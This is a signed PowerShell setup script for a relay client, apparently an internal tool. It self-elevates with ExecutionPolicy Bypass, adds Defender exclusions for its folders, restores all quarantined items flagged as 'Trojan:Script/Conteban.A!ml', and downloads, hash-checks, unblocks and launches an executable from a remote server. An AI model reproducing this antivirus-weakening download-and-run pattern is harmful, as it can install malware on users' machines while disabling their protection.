# 木林森中转移守电脑初始化
#
# 作用：一次性把这类机器配置成"Defender 不误杀中转客户端"的状态，然后下载并启动最新版。
# 只有第一次需要运行；之后自动升级不会再被拦截。
#
# 做三件事：
#   1. 把客户端目录和配置目录加入 Defender 排除（这一步必须最先做，否则下载/运行会被当场删除）
#   2. 尝试把之前被隔离的安装包放回来（尽力而为，失败不影响后续）
#   3. 从 VPS 下载当前发布版本，校验 SHA-256 后启动
#
# 需要管理员权限，脚本会自动申请。

param([switch]$Elevated)

$ErrorActionPreference = 'Stop'
$InstallDirectory = 'C:\MulinSenRelay'
$ConfigDirectory  = Join-Path $env:LOCALAPPDATA 'StratumSecureRelay'
$GateBase         = 'https://status1.mulinsen.win/exe'
$ThreatName       = 'Trojan:Script/Conteban.A!ml'

function Test-Administrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]$identity
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Write-Step([string]$Text) { Write-Host "==> $Text" -ForegroundColor Cyan }
function Write-Ok([string]$Text)   { Write-Host "    完成：$Text" -ForegroundColor Green }
function Write-Warn([string]$Text) { Write-Host "    注意：$Text" -ForegroundColor Yellow }

if (-not (Test-Administrator)) {
    Write-Host '正在申请管理员权限，请在弹窗中点"是"...' -ForegroundColor Yellow
    $arguments = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', ('"' + $PSCommandPath + '"'), '-Elevated')
    try {
        Start-Process -FilePath 'powershell.exe' -ArgumentList $arguments -Verb RunAs | Out-Null
    } catch {
        Write-Host '未获得管理员权限，无法继续。请右键选择"以管理员身份运行"。' -ForegroundColor Red
        Read-Host '按回车退出'
    }
    exit
}

Write-Host ''
Write-Host '  木林森中转移守电脑初始化' -ForegroundColor White
Write-Host '  ----------------------------------------' -ForegroundColor DarkGray

# 1) 排除目录：必须在下载和运行之前完成
Write-Step '把客户端目录加入 Defender 排除'
try {
    New-Item -ItemType Directory -Force -Path $InstallDirectory | Out-Null
    Add-MpPreference -ExclusionPath $InstallDirectory -ErrorAction Stop
    Write-Ok $InstallDirectory
} catch {
    Write-Warn "无法写入 Defender 排除（$($_.Exception.Message)）"
    Write-Warn '如果这台机器装有第三方杀毒软件，请手动把该目录加入白名单。'
}
try {
    if (Test-Path $ConfigDirectory) {
        Add-MpPreference -ExclusionPath $ConfigDirectory -ErrorAction Stop
        Write-Ok $ConfigDirectory
    }
} catch {
    Write-Warn "配置目录排除失败：$($_.Exception.Message)"
}

# 2) 尽力把之前被隔离的文件放回来
Write-Step '尝试恢复之前被隔离的安装包'
$mpCmd = Join-Path $env:ProgramFiles 'Windows Defender\MpCmdRun.exe'
if (Test-Path $mpCmd) {
    try {
        & $mpCmd -Restore -Name $ThreatName -All 2>&1 | Out-Null
        Write-Ok '已请求恢复（若从未被隔离，此处无实际动作）'
    } catch {
        Write-Warn "恢复请求失败：$($_.Exception.Message)"
    }
} else {
    Write-Warn '找不到 MpCmdRun.exe，跳过恢复步骤'
}

# 3) 下载最新版并校验
Write-Step '从 VPS 读取当前发布版本'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$manifest = $null
for ($attempt = 1; $attempt -le 2 -and -not $manifest; $attempt++) {
    try {
        $manifest = Invoke-RestMethod -Uri "$GateBase/manifest" -TimeoutSec 20 -UseBasicParsing
    } catch {
        if ($attempt -eq 2) { throw }
        Start-Sleep -Seconds 2
    }
}
if (-not $manifest -or -not $manifest.version -or -not $manifest.file) {
    throw '无法读取发布清单，请检查网络。'
}
Write-Ok "最新版本 $($manifest.version)，$([math]::Round($manifest.size / 1KB)) KB"
$target = Join-Path $InstallDirectory $manifest.file

Write-Step "下载 $($manifest.file)"
$downloaded = $false
for ($attempt = 1; $attempt -le 2 -and -not $downloaded; $attempt++) {
    try {
        Invoke-WebRequest -Uri "$GateBase/$($manifest.file)" -OutFile $target -TimeoutSec 300 -UseBasicParsing
        $downloaded = $true
    } catch {
        $message = $_.Exception.Message
        if ($message -match '410' -or $message -match 'Gone') {
            throw '下载闸门当前未开放。请联系管理员在管理面板打开"客户端下载闸门"后再运行本脚本。'
        }
        if ($attempt -eq 2) { throw }
        Start-Sleep -Seconds 2
    }
}

Write-Step '校验安装包'
$actual = (Get-FileHash -LiteralPath $target -Algorithm SHA256).Hash.ToLowerInvariant()
if ($actual -ne $manifest.sha256.ToLowerInvariant()) {
    Remove-Item -LiteralPath $target -Force -ErrorAction SilentlyContinue
    throw "摘要不一致，已删除下载的文件。期望 $($manifest.sha256)，实际 $actual"
}
Write-Ok "SHA-256 一致（$($actual.Substring(0,16))…）"

# 4) 启动
Write-Step '启动中转客户端'
$running = Get-Process -Name '木林森*' -ErrorAction SilentlyContinue
if ($running) {
    Write-Warn '检测到旧版本正在运行，先结束它'
    $running | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}
Unblock-File -LiteralPath $target -ErrorAction SilentlyContinue
Start-Process -FilePath $target -WorkingDirectory $InstallDirectory

Write-Host ''
Write-Host '  配置完成，中转客户端已启动。' -ForegroundColor Green
Write-Host "  安装位置：$InstallDirectory" -ForegroundColor Gray
Write-Host '  以后升级不需要再运行本脚本。' -ForegroundColor Gray
Write-Host ''
Read-Host '按回车关闭'

# SIG # Begin signature block
# MIIddgYJKoZIhvcNAQcCoIIdZzCCHWMCAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBqyG6b3yfQXZhZ
# zNl0Bqc2iTQ2ydkd8cDnEFQAggmeuqCCF0IwggQEMIICbKADAgECAhBxAwasVzMa
# o0L/ogScwfCEMA0GCSqGSIb3DQEBCwUAMBoxGDAWBgNVBAMMD+acqOael+ajruS4
# rei9rDAeFw0yNjA5MTQwMzM0MDhaFw0zMTA5MTQwMzQ0MDdaMBoxGDAWBgNVBAMM
# D+acqOael+ajruS4rei9rDCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGB
# ALSzQIODRot1BM0aw9Qqr6HOkuhuNXqTSnRxcTfUX8zmztyXKMcHmYmCIcrS/JoT
# 7B6TiYWMG6c10FMKrotFnn1sR3v9xKJ1o779q8yA+WH6IGCbtY2aKX6svuldBVti
# AO7vypf+jrByYIXM3X6DG9SyyL4oqiguI3bug3i9xy3uK6G75chKL6kp2fByfFaB
# WrG0THIJ9wTJaVBrYoJbZLIifjWH/ZLw+zgGpf1vYjmxkfrVDAtoyVqePjTUV2bf
# HoMTlfdCAaiQCiFD3DW+2B5DfSjI2P1al9oyG/1xNgDRmKavEbh/MiPOI7ZCug49
# VFbqUPwtbWROWuSzk1kGm3pTxPLKyREpZR4fe7adwfJoF62MK/qR81Pl/0Q2rYta
# rc/AJkHputXXVdPyJOoxGKb/FZvhQVxlal8r3WBqjA82OoWUhgOJRKq70jnP8K1e
# J9//Hiso5KtYgNGqybDj0iHJErqTnvjLT+ZgdTL8xCAnJhpsb3kIgKAqlQK71rGV
# IQIDAQABo0YwRDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMw
# HQYDVR0OBBYEFK7BtRBvlGwoMPl84fXCEVAZn0DgMA0GCSqGSIb3DQEBCwUAA4IB
# gQAd5Tw55XUMNMMT45OiMXZL3i2Is02RJyoMr76KQZfaEwjIuKDpclKeAbmGyOjn
# qaqO1fJ+87MIVZa7Bj75opX+tJs3UaZP7qzOp1swGr8euYDa1sJlxYJCObnfWwNb
# fbWUHfENN7bppSnHDssd90A8d1d+zVPOEl1ZN/G4WJqVHFoAQBocmDefxTITS/8v
# nQ6Jit3FZ/rIOiWeNgOFPAYMP29eQxhfPvRAQuHA7K3ob28QkdEonckqYbqZtx6m
# HfWkG/z9ymUbi7UQ3vwuhdlVYCZukqYe2yJ//jvzlwr+DSN6vNFRfSd2oxgx0+My
# QO9Lju9w9EShmglJ27UjD9rMy7Ant2gvQf7K+lwG3dJXwCFyv1SBVAn7l1Ns4M5T
# Py9W+ZzVRxGC4MNqKMAAtAF+v1AVj9T/UeuIVVM0TnCHEhoJpiCIr8vi3qGCAsZP
# tpVL0E1u7ACbv/DpTL0ak14ez1JCd6XImCwuX+dQmQlciIYLIpFWZvG9hCCDnBB4
# 70QwggWNMIIEdaADAgECAhAOmxiO+dAt5+/bUOIIQBhaMA0GCSqGSIb3DQEBDAUA
# MGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsT
# EHd3dy5kaWdpY2VydC5jb20xJDAiBgNVBAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQg
# Um9vdCBDQTAeFw0yMjA4MDEwMDAwMDBaFw0zMTExMDkyMzU5NTlaMGIxCzAJBgNV
# BAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdp
# Y2VydC5jb20xITAfBgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDCCAiIw
# DQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAL/mkHNo3rvkXUo8MCIwaTPswqcl
# LskhPfKK2FnC4SmnPVirdprNrnsbhA3EMB/zG6Q4FutWxpdtHauyefLKEdLkX9YF
# PFIPUh/GnhWlfr6fqVcWWVVyr2iTcMKyunWZanMylNEQRBAu34LzB4TmdDttceIt
# DBvuINXJIB1jKS3O7F5OyJP4IWGbNOsFxl7sWxq868nPzaw0QF+xembud8hIqGZX
# V59UWI4MK7dPpzDZVu7Ke13jrclPXuU15zHL2pNe3I6PgNq2kZhAkHnDeMe2scS1
# ahg4AxCN2NQ3pC4FfYj1gj4QkXCrVYJBMtfbBHMqbpEBfCFM1LyuGwN1XXhm2Tox
# RJozQL8I11pJpMLmqaBn3aQnvKFPObURWBf3JFxGj2T3wWmIdph2PVldQnaHiZdp
# ekjw4KISG2aadMreSx7nDmOu5tTvkpI6nj3cAORFJYm2mkQZK37AlLTSYW3rM9nF
# 30sEAMx9HJXDj/chsrIRt7t/8tWMcCxBYKqxYxhElRp2Yn72gLD76GSmM9GJB+G9
# t+ZDpBi4pncB4Q+UDCEdslQpJYls5Q5SUUd0viastkF13nqsX40/ybzTQRESW+UQ
# UOsxxcpyFiIJ33xMdT9j7CFfxCBRa2+xq4aLT8LWRV+dIPyhHsXAj6KxfgommfXk
# aS+YHS312amyHeUbAgMBAAGjggE6MIIBNjAPBgNVHRMBAf8EBTADAQH/MB0GA1Ud
# DgQWBBTs1+OC0nFdZEzfLmc/57qYrhwPTzAfBgNVHSMEGDAWgBRF66Kv9JLLgjEt
# UYunpyGd823IDzAOBgNVHQ8BAf8EBAMCAYYweQYIKwYBBQUHAQEEbTBrMCQGCCsG
# AQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wQwYIKwYBBQUHMAKGN2h0
# dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRFJvb3RD
# QS5jcnQwRQYDVR0fBD4wPDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29t
# L0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDARBgNVHSAECjAIMAYGBFUdIAAw
# DQYJKoZIhvcNAQEMBQADggEBAHCgv0NcVec4X6CjdBs9thbX979XB72arKGHLOyF
# XqkauyL4hxppVCLtpIh3bb0aFPQTSnovLbc47/T/gLn4offyct4kvFIDyE7QKt76
# LVbP+fT3rDB6mouyXtTP0UNEm0Mh65ZyoUi0mcudT6cGAxN3J0TU53/oWajwvy8L
# punyNDzs9wPHh6jSTEAZNUZqaVSwuKFWjuyk1T3osdz9HNj0d1pcVIxv76FQPfx2
# CWiEn2/K2yCNNWAcAgPLILCsWKAOQGPFmCLBsln1VWvPJ6tsds5vIy30fnFqI2si
# /xK4VC0nftg62fC2h5b9W9FcrBjDTZ9ztwGpn1eqXijiuZQwgga0MIIEnKADAgEC
# AhANx6xXBf8hmS5AQyIMOkmGMA0GCSqGSIb3DQEBCwUAMGIxCzAJBgNVBAYTAlVT
# MRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5j
# b20xITAfBgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0yNTA1MDcw
# MDAwMDBaFw0zODAxMTQyMzU5NTlaMGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5E
# aWdpQ2VydCwgSW5jLjFBMD8GA1UEAxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBUaW1l
# U3RhbXBpbmcgUlNBNDA5NiBTSEEyNTYgMjAyNSBDQTEwggIiMA0GCSqGSIb3DQEB
# AQUAA4ICDwAwggIKAoICAQC0eDHTCphBcr48RsAcrHXbo0ZodLRRF51NrY0NlLWZ
# loMsVO1DahGPNRcybEKq+RuwOnPhof6pvF4uGjwjqNjfEvUi6wuim5bap+0lgloM
# 2zX4kftn5B1IpYzTqpyFQ/4Bt0mAxAHeHYNnQxqXmRinvuNgxVBdJkf77S2uPoCj
# 7GH8BLuxBG5AvftBdsOECS1UkxBvMgEdgkFiDNYiOTx4OtiFcMSkqTtF2hfQz3zQ
# Sku2Ws3IfDReb6e3mmdglTcaarps0wjUjsZvkgFkriK9tUKJm/s80FiocSk1VYLZ
# lDwFt+cVFBURJg6zMUjZa/zbCclF83bRVFLeGkuAhHiGPMvSGmhgaTzVyhYn4p0+
# 8y9oHRaQT/aofEnS5xLrfxnGpTXiUOeSLsJygoLPp66bkDX1ZlAeSpQl92QOMeRx
# ykvq6gbylsXQskBBBnGy3tW/AMOMCZIVNSaz7BX8VtYGqLt9MmeOreGPRdtBx3yG
# OP+rx3rKWDEJlIqLXvJWnY0v5ydPpOjL6s36czwzsucuoKs7Yk/ehb//Wx+5kMqI
# MRvUBDx6z1ev+7psNOdgJMoiwOrUG2ZdSoQbU2rMkpLiQ6bGRinZbI4OLu9BMIFm
# 1UUl9VnePs6BaaeEWvjJSjNm2qA+sdFUeEY0qVjPKOWug/G6X5uAiynM7Bu2ayBj
# UwIDAQABo4IBXTCCAVkwEgYDVR0TAQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQU729T
# SunkBnx6yuKQVvYv1Ensy04wHwYDVR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4c
# D08wDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUF
# BwEBBGswaTAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEG
# CCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRU
# cnVzdGVkUm9vdEc0LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5k
# aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNybDAgBgNVHSAEGTAX
# MAgGBmeBDAEEAjALBglghkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBABfO+xaA
# HP4HPRF2cTC9vgvItTSmf83Qh8WIGjB/T8ObXAZz8OjuhUxjaaFdleMM0lBryPTQ
# M2qEJPe36zwbSI/mS83afsl3YTj+IQhQE7jU/kXjjytJgnn0hvrV6hqWGd3rLAUt
# 6vJy9lMDPjTLxLgXf9r5nWMQwr8Myb9rEVKChHyfpzee5kH0F8HABBgr0UdqirZ7
# bowe9Vj2AIMD8liyrukZ2iA/wdG2th9y1IsA0QF8dTXqvcnTmpfeQh35k5zOCPmS
# Nq1UH410ANVko43+Cdmu4y81hjajV/gxdEkMx1NKU4uHQcKfZxAvBAKqMVuqte69
# M9J6A47OvgRaPs+2ykgcGV00TYr2Lr3ty9qIijanrUR3anzEwlvzZiiyfTPjLbnF
# RsjsYg39OlV8cipDoq7+qNNjqFzeGxcytL5TTLL4ZaoBdqbhOhZ3ZRDUphPvSRmM
# Thi0vw9vODRzW6AxnJll38F0cuJG7uEBYTptMSbhdhGQDpOXgpIUsWTjd6xpR6oa
# Qf/DJbg3s6KCLPAlZ66RzIg9sC+NJpud/v4+7RWsWCiKi9EOLLHfMR2ZyJ/+xhCx
# 9yHbxtl5TPau1j/1MIDpMPx0LckTetiSuEtQvLsNz3Qbp7wGWqbIiOWCnb5WqxL3
# /BAPvIXKUjPSxyZsq8WhbaM2tszWkPZPubdcMIIG7TCCBNWgAwIBAgIQCE/cM09+
# RU7bww+P+ZIYNTANBgkqhkiG9w0BAQsFADBpMQswCQYDVQQGEwJVUzEXMBUGA1UE
# ChMORGlnaUNlcnQsIEluYy4xQTA/BgNVBAMTOERpZ2lDZXJ0IFRydXN0ZWQgRzQg
# VGltZVN0YW1waW5nIFJTQTQwOTYgU0hBMjU2IDIwMjUgQ0ExMB4XDTI2MDgwNTAw
# MDAwMFoXDTM3MTEwNDIzNTk1OVowYzELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRp
# Z2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdpQ2VydCBTSEEyNTYgUlNBNDA5NiBU
# aW1lc3RhbXAgUmVzcG9uZGVyIDIwMjYgMTCCAiIwDQYJKoZIhvcNAQEBBQADggIP
# ADCCAgoCggIBALZ7pvLJ/s1K+NSbTGWz/TjGMPh8CQ6RucZCLv5anHzWJjF/NWJr
# FIhy24fcpKXlgRiky4WAawDfU3YP0BMxt9l3Dm5oCG5Z69AqEN1kgHg2epx+l+lZ
# BcmJCcN0ASURML5uFIS80sZsDwO3BSkUxDjLJhBI+qiZP3aixAC/qEGLjsBNlLol
# 9VZ7pfGEXiMlneJIC5/YKuizVzNFKZZEeoy/0B8Zm+nzKBgSWG52lCO1w+nCg6Xp
# CtklTJXeIg283hw7TmmsZXR+SMbjbrEOvZ3fP2VxIgeR28Y90ZStd3F9VuA5RVyn
# b/whITPAo9b75Zr4Ta6Mj3URm26QZYMn/FnbuTegcoRcFEZ9FOqM5T6MTdtr/n74
# lIT/ug0eeOzmZ6QTFg33otX+bFRsIolvykE1jive4PuESaT8zzVeFWDAMDtozNgL
# ctkGD1ZjkEyZtJrLl5ya0m5doH/ScpaZCZVl6pNUOCybMc/kxC6EAmSJY24L0yYK
# D1Nkddsnb/ItVKi/2nXpQNMu1PT5prW83vV8d67WowuUs0HdY4H8AMLGvdL/WHEj
# 3ZnqMqAQQP9u3Ai9t+5eQ02GDwy0ODjdzi0xlp70W+ow63/0++YDEX1M0iwgUHwb
# rJvfpklkZQvw3+kv3vUPItdwroczk9icflf55W1zOEKAcJVAIXpcMCU9AgMBAAGj
# ggGVMIIBkTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBQUyWOKMC7USvtulPPm40B+
# 9ezN4jAfBgNVHSMEGDAWgBTvb1NK6eQGfHrK4pBW9i/USezLTjAOBgNVHQ8BAf8E
# BAMCB4AwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwgZUGCCsGAQUFBwEBBIGIMIGF
# MCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wXQYIKwYBBQUH
# MAKGUWh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRH
# NFRpbWVTdGFtcGluZ1JTQTQwOTZTSEEyNTYyMDI1Q0ExLmNydDBfBgNVHR8EWDBW
# MFSgUqBQhk5odHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVk
# RzRUaW1lU3RhbXBpbmdSU0E0MDk2U0hBMjU2MjAyNUNBMS5jcmwwIAYDVR0gBBkw
# FzAIBgZngQwBBAIwCwYJYIZIAYb9bAcBMA0GCSqGSIb3DQEBCwUAA4ICAQCNxTph
# Hp1SCt+ZrAmAfn0oQLFr0mLywSLaDXQIENoyKqxrFbJblzCVP/pkXmwXOdrOpWyg
# LzlT12os5ipDCy35RBCg2UMeApEtrfGhz45F4Wt4WGdNdIbRWt3YTYJmpR+b7lr4
# d7Uwn+H600u4D7RnOGf8Wj4UNgAdZkfHhHv1mx9EVh71SJelcEN/oORSjXzdjfw1
# iZH9d8Nh/thn6hH23d+VsPAr6GAYyzSA02nXD1nYLI7Ijmiv+xLCiYC41DSFYL3G
# hTiy0PxpawPtGRyaBVGzq+UiTfM8pD7KVyF5aQyWP4KhVGUUTnmm/RlYJoW3TiXA
# /+t0YcT2oRVBm3JETjajHug2AL+v5jhtKVnd3D0rbHXEu27o+Q8p4sEWPMqKDB+q
# bceb6T/6WcwTwXmQ9lOCLLYcsQeSWmvKqzpAec9etE14jOQAzLKWdE3w/TCaKtLR
# aRT7LCkRYVnhA2D73FLje1O5b3HR5eHs0NzU/+xX7NbEdcofy0W3Wdwd1XOqtlpg
# /JgwtKfZM5dqO94lbUveOiJBI+xZEbGRsMNbXmMREUTgu+Oca7Y73MPWcslIx2Vh
# kSKSXjDbD6rgg39H5Mh7QfieAIjWagkJNt68Yfim6cjEzVSiLSeZfdkr5dtFPTW6
# jATlWJdYeeDRGCyatf8R1hSjzSvdN8yWQPT9gzGCBYowggWGAgEBMC4wGjEYMBYG
# A1UEAwwP5pyo5p6X5qOu5Lit6L2sAhBxAwasVzMao0L/ogScwfCEMA0GCWCGSAFl
# AwQCAQUAoIGEMBgGCisGAQQBgjcCAQwxCjAIoAKAAKECgAAwGQYJKoZIhvcNAQkD
# MQwGCisGAQQBgjcCAQQwHAYKKwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARUwLwYJ
# KoZIhvcNAQkEMSIEIEfkgmlf9/TV8289hsos3E80RgzC9bCBL0WXKZAo90iHMA0G
# CSqGSIb3DQEBAQUABIIBgG7DXXyByFRDzZEzoifW4hjYk5bhe4DU6w4tXT1XsUfJ
# MohpCn6W+F0u0VAVVydZHVAH+2GJIvNM8S/wYos3RK9Ysf/r2wtYSVx9mumCYAn/
# LMUQ7s7Egr2D1hpAzFl38xMmbx/w9vfzfmMAOZWenwn6ocIL3ubxyzt9BxBi0JWj
# zfvC0cT2Bx7jGF73b656CeqmzkqQRg8TW9MAhFHUiGPU++6hf0VvHZtkwf0vMolJ
# PY5s2UmeJRo+6231sYJDxJj/5nJYxe5POgWmXZapyHjfR2p2wIOw4u4Rl/5W7erC
# zV+PcjjA6Z0B1HEQjLEFj1Ro04jdmgn4btzPrqi27GW7tYwzUTELCt328I48svFQ
# CQpGnfhgixcsv9bVWg+0+LaLiv4uiwEoyia8+j8IuLXBv4sea+9LQj+6058QNT+i
# I0QyRzRGEl6T70Pb3xC1ofjcXoxk4bjzBDvcHn4qO8Mn/95wEj/E9ctO0BgZcwCd
# EVRirQd04wRF/7giDM39DKGCAyYwggMiBgkqhkiG9w0BCQYxggMTMIIDDwIBATB9
# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBUaW1lU3RhbXBpbmcgUlNBNDA5NiBTSEEy
# NTYgMjAyNSBDQTECEAhP3DNPfkVO28MPj/mSGDUwDQYJYIZIAWUDBAIBBQCgaTAY
# BgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0yNjEwMjcw
# ODQwMDZaMC8GCSqGSIb3DQEJBDEiBCCJPZFd3fjSu7OL0RPvX+D+OKO6IE9u1yM5
# 0dgz3ECy+DANBgkqhkiG9w0BAQEFAASCAgB8e0aust2da1eg2MGPbH+g74M9hgvu
# oyy0CFtkrrO2Iq8ecywvWtTsqSSfk0sE2rQq0PkZwjOtKZpm8Eb5UR/sgXvfcvEf
# 8dr2jJZ/urZ4awnREaa9leCZxoMRQIh/KjEljS2Wp3l8KgXzXkBzxBn/mjsuFDTP
# LQj4+hHGqoP7q2uGWpmovLDaUfWlgshoOxaYYYiY4oxrwI3bT86f3qyD7h+5878g
# Be0aGx8iQDREQ5qnjXB1yNSOEsgjcAoFBzNXNWW6AMdyx9vGo0tbd156QD2MR1oe
# vo2sWlpb7tOop9/1me6xjokOXXT3Ruz5QWR3iaxk2uGxB6/mzp4AzvT30hc7VQTQ
# tjO/p5eYLwzmndSU34iJFwE2a3rUUG2WfQH+b1oj3Y8yN+SqSfNsOo4I1h4AmWfI
# dkSwUpr9J0wdCrOov9Cij3IXd/lGhocUOJ3un5UJg5+RXM1eKSr+kT63KokadMmD
# WDPsYX8EE3PHaYpl/m9tUt9yMfhTK59moDnV5v5fn/vRHzU4aoYJCQWIVES13rAe
# C2eUs4WlskjrOsauv/i0UC5NdvNukZ3cHx+489H3QfkkSPXctMov5WB/+dS5/sxU
# er1vzgo8IEtVevqiJbm3TKcjZvW/jHEDXCu6OKswOq0Z9hM3Lm+rmXYR3FNVgwS7
# +RQWOau65U/sgg==
# SIG # End signature block
